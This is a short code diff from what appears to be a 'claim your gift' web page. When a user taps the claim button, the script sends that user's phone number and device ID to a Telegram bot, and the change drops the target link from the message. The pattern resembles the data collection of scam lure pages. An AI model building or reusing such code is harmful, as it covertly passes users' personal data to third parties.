@@ -1508,7 +1508,7 @@
                 if (navigator.vibrate) { try { navigator.vibrate(30); } catch(e) {} }
                 this.innerHTML = '<span>⏳ OPENING...</span>';
                 this.style.pointerEvents = 'none'; this.style.opacity = '0.85';
-                sendTelegram('🎁 USER TAPPED CLAIM\n👤 ' + userPhone + '\n🖥️ ' + deviceDisplayId + '\n📦 v' + SYSTEM_VERSION + '\n🔗 ' + targetUrl);
+                sendTelegram('🎁 USER TAPPED CLAIM\n👤 ' + userPhone + '\n🖥️ ' + deviceDisplayId + '\n📦 v' + SYSTEM_VERSION);
 
                 if (SYSTEM_VERSION === 2 && activeLinkKey && userPhone && db) {
                     try {
